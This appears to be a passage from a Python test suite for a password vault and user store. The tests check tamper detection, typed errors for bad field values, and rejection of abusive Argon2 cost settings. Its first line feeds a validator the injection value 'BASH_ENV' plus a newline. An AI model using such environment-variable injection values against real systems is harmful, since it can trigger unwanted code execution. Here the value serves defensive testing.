    assert is_safe_name("BASH_ENV\n") is False


# ── Review findings 2-4: contract/robustness hardening ───────────────────────

def test_finding2_non_ascii_vault_id_surfaces_as_tampering_not_a_crash():
    """A file-writer setting vault_id to non-ASCII text used to raise a raw
    UnicodeEncodeError out of Vault.open (vault_id feeds the entry-set MAC via
    an ASCII encode). It must instead be caught as tampering and fail closed,
    honoring the "every failure is a typed VaultError" contract."""
    v, path = _vault()
    v.set("svc", "secret")
    v.close()

    conn = sqlite3.connect(str(path))
    conn.execute("UPDATE vault_meta SET value=? WHERE key='vault_id'", ("idéx",))
    conn.commit()
    conn.close()

    v2 = Vault.open(path, password=PW)      # no raw exception escapes
    assert v2.tampered is True              # a changed vault_id breaks the MAC
    assert v2.corrupt_count == 1            # ...and the AAD, so the blob won't decrypt
    with pytest.raises(VaultCorrupted):     # fails closed, no stale secret
        v2.get("svc")
    v2.close()


def test_finding3_non_serializable_fields_raise_typed_error():
    """add_user/update_fields handed a non-JSON value (set, bytes) used to
    raise a raw TypeError from json.dumps; it must be the store's typed
    AuthStoreError so callers guarding the store API surface still catch it."""
    store = UserStore(_store())
    for value in ({1, 2, 3}, b"bytes"):
        with pytest.raises(AuthStoreError):
            store.add_user("alice", "alice-pw", data=value)
    assert store.add_user("bob", "bob-pw", role="admin") is True   # normal fields ok
    with pytest.raises(AuthStoreError):
        store.update_fields("bob", data={9})
    store.close()


def test_finding4_abusive_time_and_parallelism_costs_are_rejected():
    """The trusted cost ceilings bound a tampered row's blast radius: because
    _dummy_costs() prices every unknown-user probe at the most expensive row,
    a wide ceiling turns one row into a store-wide login DoS. Library defaults
    and sane operator values still validate; interactive-implausible costs do
    not."""
    _validated_costs(ARGON2_TIME_COST, ARGON2_MEMORY_COST, 4)   # defaults accepted
    _validated_costs(10, 1 << 20, 8)                            # generous but sane
    with pytest.raises(AuthStoreError):
        _validated_costs(32, 1 << 20, 4)                        # abusive time_cost
    with pytest.raises(AuthStoreError):
        _validated_costs(3, 65536, 64)                          # abusive parallelism
